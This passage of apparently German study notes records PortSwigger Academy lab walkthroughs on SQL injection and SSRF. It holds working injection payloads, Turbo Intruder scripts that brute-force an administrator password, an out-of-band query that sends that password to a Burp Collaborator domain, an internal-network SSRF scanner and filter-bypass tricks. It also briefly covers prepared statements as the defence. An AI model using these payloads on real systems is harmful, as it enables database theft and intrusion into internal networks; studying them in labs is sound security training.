PLACEHOLDER2)\n    template = target.req\n\n    for i in range(1, password_length + 1):\n        for ch in characters:\n            # Wandle i in String um und ersetze beide Platzhalter\n            req = template.replace(\"PLACEHOLDER1\", str(i)).replace(\"PLACEHOLDER2\", ch)\n            # Queue den Request\n            engine.queue(req)\n\n    # Wichtig: das Engine-Objekt zur\u00fcckgeben\n    return engine\n\ndef handleResponse(req, interesting):\n    # 'table' ist in TI normalerweise vorhanden - f\u00fcgt die Zeile zur UI hinzu\n    try:\n        table.add(req)\n    except Exception:\n        # Fallback-Log, falls table nicht verf\u00fcgbar ist\n        print(\"Error:\", req)\n</code></pre><p></p> <p>L\u00e4sst sich dann wie folgt einsetzen. </p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/","title":"5. Error Based SQL Injection","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/#was-ist-error-based-sql-injection","title":"Was ist Error-Based SQL-Injection","text":"<p>Wie der Name schon sagt, anhand von Fehlermeldungen l\u00e4sst sich diverses Verhalten zwischen App und Datenbank nachvollziehen und ggf. ausnutzen - Man provoziert einen DB-Fehler nur dann, wenn eine getestete Bedingung zutrifft     - Man verpackt die Bedingung in eine Ausdrucksform die bei True einen Fehler verursacht(z. B. Division durch Null)</p> <p>Das k\u00f6nnte man dann wie folgt aufbauen: </p><pre><code>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a\nxyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a\n</code></pre> Hier sehen wir das Ergebnis wenn unser Input false istHier sehen wir das Ergebnis wenn unser Input true ist<p></p> <p>In diesem Fall benutzen wir den 'CASE' Aufruf - In dem ersten Fall evaluieren wir zu a weil Ergebnis false - In dem zweiten Fall evaluieren wir zu Error weil macht <code>1/0</code> und wir k\u00f6nnen nicht durch 0 teilen</p> <p>Und dann kann man Anfragen wie folgt bauen: </p><pre><code>xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') THEN 1/0 ELSE 'a' END FROM Users)='a\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/#lab-blind-sql-injection-with-conditional-errorsoracle","title":"Lab: Blind SQL injection with conditional errors(Oracle)","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/#passwortlange-herausfinden-im-intruder-dann-bruteforcen","title":"Passwortl\u00e4nge herausfinden -&gt; Im Intruder dann bruteforcen","text":"<pre><code>TrackingId=EVe4hpFzFe2H0qvD' AND (SELECT CASE WHEN (LENGTH(password) &gt; \u00a720\u00a7) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--;\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/#passwort-brute-forcen","title":"Passwort brute-forcen","text":"<pre><code>TrackingId=EVe4hpFzFe2H0qvD' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) &lt; 'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--;\n</code></pre> <p>Jetzt setzen wir folgendes PAYLOAD zusammen und bruteforcen jeden einzelnen CharacterUnser Turbo-Intruder liefert uns folgendes Ergebnis.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/#auslegen-von-daten-durch-fehlernachrichten","title":"Auslegen von Daten durch Fehlernachrichten","text":"<p>Gelegentlich kann auch die Fehlermeldung sensible Daten aus der tats\u00e4chlichen Abfrage enthalten.</p> <pre><code>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char\n</code></pre> <p>Diese Meldung zeigt die gesamte Abfrage, die die Anwendung aus den Eingaben konstruiert hat. Dadurch l\u00e4sst sich das Verhalten zwischen App und DB auch nochmal besser begutachten. Das verwandelt die sonst blinde injection in eine visible injection.</p> <p>Mit der <code>CAST()</code> Funktion k\u00f6nnen wir Datentypen in einen anderen konvertieren. z. B.</p> <p></p><pre><code>CAST((SELECT example_column FROM example_table) AS int)\n</code></pre> Oft sind die zu lesenden Daten Zeichenketten (Strings). Wenn du versuchst, diese in einen inkompatiblen Datentyp wie <code>int</code> zu konvertieren, kann das einen Fehler wie den folgenden erzeugen:<p></p> <p></p><pre><code>ERROR: invalid input syntax for type integer: \"Example data\"\n</code></pre> Solche Abfragen sind au\u00dferdem n\u00fctzlich, wenn ein Limit der Zeichenl\u00e4nge verhindert, dass du konditionale Antworten (true/false) ausl\u00f6sen kannst - ein Fehler mit eingebettetem Inhalt kann dann die einzige M\u00f6glichkeit zur Datenexfiltration sein.<p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/#lab-visible-error-based-sql-injection","title":"Lab: Visible error-based SQL injection","text":"<ol> <li>Erstmal wieder rumprobieren und schauen wo die App SQL Querys baut.<ol> <li>Wir f\u00fcgen <code>'</code> an mehrere Inputs und sehen bei TrackingID kommt ein SQL Query Error. </li> </ol> </li> <li>Wir kommentieren den rest aus aus der Anfrage und sehen kein Fehler mehr -&gt; also wissen wir, dass es anschl\u00e4gt. </li> <li>Wir casten zu int und schauen was passiert -&gt; wir sehen, dass es ein boolean Type sein muss, kein Integer. </li> <li>Wir passen die Anfrage an mit einem 1= um einen boolean daraus zu machen und sehen wieder, kein Fehler. </li> <li>Nun versuchen wir auf username Tabelle von Users zuzugreifen, aber sehen wieder eine Fehlermeldung -&gt; Syntaxerror weil unser Request abgeschnitten wurde.  Vermutung liegt bei Character-Limit. { width=\"1000\" }</li> <li>Wir entfernen die TrackingID um den request k\u00fcrzer zu machen in der Hoffnung wir sind innerhalb des Limits -&gt; Die neue Fehlermeldung sagt, dass zu viele Reihen geliefert werden. </li> <li>Wir setzen bei der Abfrage ein Limit auf 1 und sehen dann den Admin weil der wahrscheinlich als erstes in der DB angelegt wurde. </li> <li>Das gleiche wiederholen wir mit der Password Tabelle. </li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/#triggering-time-delays-during-exploiting","title":"Triggering Time-Delays during exploiting","text":"<p>Wenn die Applikation alle Fehlermeldungen ordnungsgem\u00e4\u00df behandelt bekommen wir keine Infos \u00fcber den Zustand der Datenbank. In diesem Fall k\u00f6nnte man auf Time-Delays triggern w\u00e4hrend requests. </p><pre><code>'; IF (1=2) WAITFOR DELAY '0:0:10'-- \n'; IF (1=1) WAITFOR DELAY '0:0:10'--\n</code></pre><p></p> <p>davon k\u00f6nnte man dann beispielsweise wie folgt Gebraucht machen </p><pre><code>'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'--\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/5.%20Error-Based%20SQL%20Injection/#lab-blind-sql-injection-with-time-delays-and-information-retrieval","title":"Lab: Blind SQL injection with time delays and information retrieval","text":"<ol> <li><code>TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--</code><ol> <li>%3B = <code>;</code></li> </ol> </li> <li><code>TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code><ol> <li>Funktioniert. weil Verarbeitung dauert bei Korrektheit l\u00e4nger</li> </ol> </li> <li>Jetzt bauen wir eine neue Anfrage mit  <pre><code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--\n</code></pre></li> <li>Wir sehen es schl\u00e4gt an also k\u00f6nnen wir davon ausgehen, dass es einen User mit dem Namen gibt</li> <li>Dann f\u00fcgen wir das selbe f\u00fcr Passwort ein und \u00fcberpr\u00fcfen die L\u00e4nge des Passworts.  <pre><code>x'%3BSELECT+CASE+WHEN+(username='administrator' AND+LENGTH(password)&gt;1)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users--\n</code></pre></li> <li>Danach k\u00f6nnen wir nach dem selben Prinzip jede Stelle des Passworts ablaufen -&gt; BruteForce Script im Turbo Intruder und dann nach Response-Time filtern <pre><code>x'%3BSELECT+CASE+WHEN+(username='administrator' AND+SUBSTRING(password,PLACEHOLDER1,1)='PLACEHOLDER2')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users--\n</code></pre></li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/6.%20Blind%20SQL%20Injection%20OAST%20Technik/","title":"6. Blind SQL Injection OAST Technik","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/6.%20Blind%20SQL%20Injection%20OAST%20Technik/#was-sind-out-of-band-techniken","title":"Was sind Out of Band Techniken","text":"<p>Manchmal f\u00fchren Apps die SQL Anragen auf einem extra Thread aus. Also es wird unabh\u00e4ngig von der User Response ausgef\u00fchrt und somit helfen die bisherigen Methoden nicht. In manchen Situationen lassen sich solche Out Of Band Interaktionen an ein System welches wir kontrollieren triggern wodurch man dann wiederum an Informationen durch das triggern der SQL Query gelangt</p> <p>Eine Anzahl an network protokolle k\u00f6nnen genutzt werden, aber am meisten typisch sind DNS Protokolle. Viele kommerzielle Netzwerke erlauben DNS Queries.</p> <p>Der einfachste Weg ist es den Burp Collaborator daf\u00fcr zu verwenden. Der Server bietet eine Vielzahl von Netzwerkprotokollen inkl. DNS.</p> <p>Unter Microsoft SQL Server kann man mit folgenden Befehl eine Anfrage an eine eigene Domain triggern.</p> <p><code>'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--</code></p> <p>Das sorgt dann daf\u00fcr, dass die Datenbank einen loopkup an folgende Domain ausf\u00fchrt. <code>0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net</code></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/6.%20Blind%20SQL%20Injection%20OAST%20Technik/#lab-blind-sql-injection-with-out-of-band-interaction","title":"LAB: Blind SQL injection with out-of-band interaction","text":"<ol> <li>Wir packen an unseren TrackingID Cookie folgendes Payload um unseren Collaborator zu triggern <pre><code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLABORATOR-SUBDOMAIN/\"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--\n</code></pre></li> </ol> <p>Wenn das anschl\u00e4gt haben wir die M\u00f6glichkeiten Daten zu extrahieren das k\u00f6nnte zB so aussehen. </p><pre><code>'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree \"//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a\"')--\n</code></pre> Das w\u00fcrde das Passwort des Administrators extrahieren und einen DNS lookup an unseren Collaborator ausf\u00fchren.<p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/7.%20SQL%20Injection%20In%20Different%20Contexts/","title":"7. SQL Injection In Different Contexts","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/7.%20SQL%20Injection%20In%20Different%20Contexts/#sql-injection-in-different-contexts-jsonxml","title":"SQL Injection In Different Contexts (JSON,XML)","text":"<p>In den bisherigen Methoden haben wir uns ausschlie\u00dflich \u00fcber direkte String Injections auseinandergesetzt.  Apps k\u00f6nnen aber auch z. B. diversen JSON oder XML formatierte Daten in einen SQL Query umwandeln. Dort wiederum werden oft Key-Words durch WAFS oder andere defense Mechanismen geblock, aber auch da gibt es die M\u00f6glichkeit einzelne Character zu encoden um aus diesem Filter auszubrechen. z. B.</p> <pre><code>&lt;stockCheck&gt; \n    &lt;productId&gt;123&lt;/productId&gt; \n    &lt;storeId&gt;999 &amp;#x53;ELECT * FROM information_schema.tables&lt;/storeId&gt; \n&lt;/stockCheck&gt;\n</code></pre>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/7.%20SQL%20Injection%20In%20Different%20Contexts/#lab-sql-injection-with-filter-bypass-via-xml-encoding","title":"Lab: SQL injection with filter bypass via XML encoding","text":"<ol> <li>Erstmal wieder auf der Seite suchen wo potentielle Schachstellen liegen k\u00f6nnen</li> <li>Haben eine potentielle Schachstelle gefunden</li> <li>Dort sehen wir es wird durch ein WAF gesch\u00fctzt. Also versuchen wir es zu encoden</li> <li>Wir sehen, encoding mit HACKVERTOR Extension schl\u00e4gt an und versuchen zus\u00e4tzlich Parameter wie UNION SELECT einzubauen. 2. SQL Injection UNION Attacks</li> <li>Nach bisschen rumprobieren sehen wir, dass folgendes anschl\u00e4gt. (Bei falscher Konstellation bekommen wir nur 0 Units als Response) </li> <li>Dann schauen wir welcher Datentyp und welche Version wir haben. Wir stellen fest bei Version() und einem String haben wir Treffer <pre><code>PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit\n</code></pre></li> <li>Jetzt schauen wir welche Tabellen es gibt. (Befehle lassen sich aus dem SQL Injection Cheat-Sheet von Portswigger entnehmen)</li> <li>Das gleiche dann mit column_name </li> <li>Und jetzt k\u00f6nnen wir username und passw\u00f6rter auslesen  </li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/8.%20Second-Order%20SQL%20Injection/","title":"8. Second Order SQL Injection","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/8.%20Second-Order%20SQL%20Injection/#second-order-sql-injection","title":"Second-Order SQL Injection","text":"<p>First-Order: Wenn man wie wir bereits gelernt haben eine Request manipuliert der eine unsichere SQL Query ausf\u00fchrt.  Second-Order: Wenn wir einen SQL Query irgendwo einschleusen der dann bei sp\u00e4teren HTTP Requests von auch z. B. andere User getriggert wird</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/9.%20Prevent%20SQL%20Injection/","title":"9. Prevent SQL Injection","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/9.%20Prevent%20SQL%20Injection/#wie-verhindert-man-sql-injection","title":"Wie verhindert man SQL Injection","text":"<p>Serverseitige Prepared-Statement </p><pre><code>PreparedStatement statement = connection.prepareStatement(\"SELECT * FROM products WHERE category = ?\"); statement.setString(1, input); ResultSet resultSet = statement.executeQuery();\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/Checkliste%20SQLi/","title":"Checkliste SQLi","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SQLi/Checkliste%20SQLi/#checkliste","title":"Checkliste","text":"<p>Finde Injektion-Eintrittsloch</p> <ol> <li>Teste mit <code>'</code> in diversen Abfragen ob das System mit Fehler reagiert um zu schauen ob sich der Input beeinflussen l\u00e4sst.</li> </ol> <p>Arten von Injektionsm\u00f6glichkeiten</p> <ul> <li>UNION/ORDER BY SELECT<ul> <li>2. SQL Injection UNION Attacks</li> </ul> </li> <li>SetOfView Injection<ul> <li>3. SQL Injection Set Of Views</li> </ul> </li> <li>Blind SQL Injection<ul> <li>4. Blind SQL Injection</li> </ul> </li> <li>Error Based SQL Injection <ul> <li>5. Error-Based SQL Injection</li> </ul> </li> <li>Time Based SQL Injection<ul> <li>5. Error-Based SQL Injection</li> </ul> </li> <li>SQL Injection in Different Context<ul> <li>7. SQL Injection In Different Contexts</li> </ul> </li> <li>Second-Order SQL Injection<ul> <li>8. Second-Order SQL Injection</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/","title":"1. SSRF Basics","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#was-ist-ssrf","title":"Was ist SSRF","text":"<p>SSRF - Server Side Request forgery ist eine Angriffsart sich die Webseite einer Firma zu nutze zu machen um ggf. Server-Interne Daten abzufragen. Also z. B.</p> <ul> <li> <p>Normal gedacht:     Du gibst <code>https://example.com/cat.jpg</code> ein \u2192 die Webseite holt sich die Katze und zeigt sie dir.</p> </li> <li> <p>Mit SSRF:     Du gibst stattdessen <code>http://127.0.0.1/admin</code> ein \u2192 die Webseite (der Server!) ruft diese interne Adresse auf.     \u279d Jetzt siehst du pl\u00f6tzlich interne Inhalte, die eigentlich nur im Firmennetz erreichbar sind \u2013 z. B. Datenbanken, Admin-Panels, Cloud-Metadaten (<code>http://169.254.169.254/</code> bei AWS).</p> </li> </ul> <p>\u00dcbliche Angriffe sind folgende:</p> <p>Bei einem SSRF Angriff wird oft \u00fcber eine HTTP Anfrage eine Loopback Anfrage zur\u00fcck an den Server \u00fcber 127.0.0.1(Loopback Adresse) geschickt um sich ggf. Zugriff auf Daten die sich auf dem Origin Server befinden zuzugreifen.</p> <p>Beispiel: Stell dir eine Shopping-Anwendung vor, die es dem Benutzer erlaubt zu sehen, ob ein Artikel in einem bestimmten Gesch\u00e4ft auf Lager ist. Um die Lagerbestandsinformationen bereitzustellen, muss die Anwendung verschiedene Backend-REST-APIs abfragen. Sie tut dies, indem sie die URL zum entsprechenden Backend-API-Endpunkt \u00fcber eine Frontend-HTTP-Anfrage weitergibt. Wenn ein Benutzer den Lagerstatus f\u00fcr einen Artikel ansieht, macht dessen Browser folgende Anfrage:</p> <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1\n</code></pre> <p>Dies f\u00fchrt dazu, dass der Server eine Anfrage an die angegebene URL macht, den Lagerstatus abruft und diesen an den Benutzer zur\u00fcckgibt.</p> <p>In diesem Beispiel kann ein Angreifer die Anfrage so ver\u00e4ndern, dass er eine URL angibt, die lokal auf dem Server liegt:</p> <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n</code></pre> <p>Der Server ruft die Inhalte der URL <code>/admin</code> ab und gibt sie an den Benutzer zur\u00fcck.</p> <p>Ein Angreifer kann die <code>/admin</code>-URL besuchen, aber die Administrationsfunktionalit\u00e4t ist normalerweise nur f\u00fcr authentifizierte Benutzer zug\u00e4nglich. Das bedeutet, dass ein Angreifer nichts Interessantes sehen w\u00fcrde. Wenn jedoch die Anfrage an die <code>/admin</code>-URL von der lokalen Maschine kommt, werden die normalen Zugriffskontrollen umgangen. Die Anwendung gew\u00e4hrt vollen Zugriff auf die Administrationsfunktionalit\u00e4t, weil die Anfrage so aussieht, als k\u00e4me sie von einem vertrauensw\u00fcrdigen Ort.</p> <p>kritische Vertrauensbeziehungen - Die Zugriffskontrolle k\u00f6nnte in einer anderen Komponente implementiert sein, die vor dem Anwendungsserver sitzt. Wenn eine Verbindung zur\u00fcck zum Server hergestellt wird, wird die Kontrolle umgangen.</p> <ul> <li> <p>F\u00fcr Notfall-Wiederherstellungszwecke k\u00f6nnte die Anwendung administrativen Zugriff ohne Login f\u00fcr jeden Benutzer erlauben, der von der lokalen Maschine kommt. Dies bietet einem Administrator die M\u00f6glichkeit, das System wiederherzustellen, falls er seine Zugangsdaten verliert. Dies geht davon aus, dass nur ein vollst\u00e4ndig vertrauensw\u00fcrdiger Benutzer direkt vom Server selbst kommt.</p> </li> <li> <p>Die Administrationsschnittstelle k\u00f6nnte auf einer anderen Portnummer als die Hauptanwendung lauschen und m\u00f6glicherweise nicht direkt von Benutzern erreichbar sein.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#lab-basic-ssrf-against-the-local-server","title":"Lab: Basic SSRF against the local server","text":"<ol> <li>Wir checken wieder die Seite aus und sehen bei Check Stock, dass die Abfrage an den Server geschickt wird { width=\"625\" }</li> <li>Wir nutzen das und setzen die Anfrage auf eine Loopbackadresse und fragen auf Loopbackebene Ressourcen ab auf die man \u00fcblicherweise kein Zugriff h\u00e4tte  </li> <li>Seite l\u00e4dt Erfolgreich -&gt; Wir laden die Seite im Browser und versuchen den User Carlos zu l\u00f6schen -&gt; Kein Zugriff weil nur von Loopback aus m\u00f6glich</li> <li>Wir passen unseren Link an und gehen zur\u00fcck in den ehemaligen POST-Req und f\u00fcgen unseren angepassten Link ein </li> <li>User Carlos erfolgreich gel\u00f6scht</li> </ol>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#ssrf-attacks-against-other-back-end-systems","title":"SSRF attacks against other back-end systems","text":"<p>Interessant wird es wenn z. B. weitere Server im selben Netzwerk verbunden sind - wenn die Server Zugriffsrechte untereinander haben kann man einfach \u00fcber den Webserver auf die Adresse eines weiteren internen Servers zugreifen und ggf. Schaden anrichten.  In der Regel sind die dann auch schw\u00e4cher gesch\u00fctzt weil die vermeintlich durch ihre Netzwerktopologie gesch\u00fctzt sind. <code>https://192.168.0.68/admin</code> </p><pre><code>POST /product/stock HTTP/1.0 \nContent-Type: application/x-www-form-urlencoded \nContent-Length: 118 \nstockApi=http://192.168.0.68/admin\n</code></pre><p></p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#lab-basic-ssrf-against-another-back-end-system","title":"Lab: Basic SSRF against another back-end system","text":"<p>Wir haben es eigentlich \u00e4hnlich wie beim letzten Lab gemacht mit dem einzigen Unterschied, wir haben erstmal schauen m\u00fcssen welche Adresse im Netzwerk \u00fcberhaupt erreichbar ist und haben \u00fcber den Intruder erstmal ein paar Adressen ausprobiert. 1. Bruteforce mit Burp Intruder oder Turbo Intruder Extension</p> <ul> <li>Burp Intruder </li> <li> <p>Turbo Intruder Extension  </p><pre><code># Minimaler SSRF-Scanner: 192.168.x.y:port -&gt; PLACEHOLDER ersetzen, alles loggen\nTHIRD \u00a0= range(0, 255) \u00a0 \u00a0 # 192.168.[0..254]\nFOURTH = range(1, 255) \u00a0 \u00a0 # .1..254\nPORTS \u00a0= [80, 443, 8080] \u00a0 # klein anfangen (erweiterbar)\nBOTH_SCHEMES = set([80, 443, 8080]) \u00a0# f\u00fcr diese Ports http &amp; https testen\n\ndef _schemes(port):\n\u00a0 \u00a0 return ['http','https'] if port in BOTH_SCHEMES else ['http']\n\ndef queueRequests(target, wordlists):\n\u00a0 \u00a0 engine = RequestEngine(endpoint=target.endpoint,\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0concurrentConnections=5,\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0requestsPerConnection=100,\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0pipeline=False,\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0engine=Engine.THREADED)\n\u00a0 \u00a0 for x in THIRD:\n\u00a0 \u00a0 \u00a0 \u00a0 for y in FOURTH:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 ip = '192.168.{0}.{1}'.format(x, y)\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 for p in PORTS:\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 for s in _schemes(p):\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 url = '{0}://{1}:{2}/'.format(s, ip, p)\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 req = target.req.replace('PLACEHOLDER', url)\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # wie in deinem Beispiel: ohne Label, ganz simpel\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 engine.queue(req)\n\ndef handleResponse(req, interesting):\n\u00a0 \u00a0 # wie in deinem Beispiel: einfach ALLES in die Tabelle\n\u00a0 \u00a0 table.add(req)\n</code></pre><p></p> </li> <li> <p>Bei erfolg testen wir noch diverse Pfade wie zB /admin im Repeater und im besten Fall treffen wir </p> </li> <li> <p>Dann schauen wir welche Anfrage ausgef\u00fchrt wird und f\u00fcgen den angepassten Link bei uns in die StockAPI mit der richtigen Adresse um diesen Befehl ausf\u00fchren zu k\u00f6nnen  </p> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#praxis-playbook-ssrf-mit-wenig-noise","title":"Praxis-Playbook: SSRF mit wenig Noise","text":"","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#1-interne-ziele-herleiten-statt-blind-zu-scannen","title":"1) Interne Ziele herleiten (statt blind zu scannen)","text":"<p>Zieh dir Hinweise auf IPs/Hosts/Ports aus der App &amp; Umgebung: - Antwort-Header &amp; Fehlerseiten: <code>Server</code>, <code>X-Powered-By</code>, <code>Location</code>, <code>Via</code>, <code>X-Forwarded-*</code>, <code>WWW-Authenticate</code>, Banner in HTML <code>&lt;title&gt;</code>. - JavaScript &amp; Source: Hardcodierte API-Hosts, WebSocket-URLs, Service-Discovery (<code>/config.json</code>, <code>/env</code>, <code>/swagger</code>, <code>/openapi.json</code>). - DNS &amp; Hostnamen: Subdomains wie <code>api.internal</code>, <code>admin.intra</code>, <code>grafana</code>, <code>prometheus</code>, <code>jenkins</code>. Reverse Proxies verraten interne Upstreams in Fehlermeldungen.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#umgehen-von-ublichen-ssrf-schutzmanahmen","title":"Umgehen von \u00fcblichen SSRF Schutzma\u00dfnahmen","text":"<p>Oft werden solche Probleme mit Loopback Anfragen mit diversen Schutzma\u00dfnahmen abgesichert, aber oft lassen die sich auch einfach umgehen.</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#1-blacklists-127001-localhost-admin-umgehen","title":"1) Blacklists (127.0.0.1, localhost, /admin) umgehen","text":"<ul> <li> <p>Alternative IP-Darstellungen f\u00fcr <code>127.0.0.1</code>:</p> <ul> <li>Dezimal: <code>2130706433</code> </li> <li>Oktal: <code>017700000001</code></li> <li>Kurzform: <code>127.1</code></li> <li>(auch gemischte/hexadezimale Schreibweisen sind teils m\u00f6glich)</li> </ul> </li> <li> <p>Eigene Domain auf 127.0.0.1 zeigen lassen (z. B. via Burp Collaborator) und diese Domain verwenden.</p> </li> <li>String verschleiern: URL-Encoding, Gro\u00df/Kleinschreibung variieren, doppelt encoden, Pfad-Tricks (z. B. <code>%2fadmin</code>, <code>..%2fadmin</code>).</li> <li>Redirect-Ketten nutzen:<ul> <li>Zuerst auf eine eigene URL zeigen, die dann weiterleitet zur gesperrten Ziel-URL.</li> <li>Verschiedene Redirect-Codes probieren (301/302/303/307/308).</li> <li>Beim Redirect Protokoll wechseln (<code>http</code> \u2192 <code>https</code> oder umgekehrt), da manche Filter nur das erste Schema pr\u00fcfen. -&gt; Blacklists sind fragil - Andere Schreibweisen, DNS-Tricks, Redirects reichen oft schon um solche Blacklist-Filter zu umgehen</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#lab-ssrf-with-blacklist-based-input-filter","title":"Lab: SSRF with blacklist-based input filter","text":"<p>Lab gel\u00f6st wie die vorherigen auch nur beim Loopback verschiedene <code>localhost</code> synonyme ausprobiert wie zB: <code>127.1</code> -&gt; Welcher zum Treffer resultierte. Danach mit <code>/admin</code> kam die Fehlermeldung, dass man keine Berechtigung hat, aber sobald man den Pfad ge\u00e4ndert hat zu <code>http://127.1/AdMiN</code> hat der Server nicht mit blocken reagiert. D.h der Pfad war vermutlich gesperrt</p>","tags":["Course/"]},{"location":"studium/PSS-Pentesting/Portswigger-Academy/SSRF/1.%20SSRF-Basics/#ssrf-with-whitelist-based-input-filters","title":"SSRF with whitelist-based input filters","text":"<p>Weil es m\u00fchsam ist alle nicht erreichbaren Seiten zu blacklisten kann man lieber die zu erreichbaren Seiten whitelisten - Diese lassen sich oft aber auch umgehen wenn man die Inkositenz beim parsen von URL 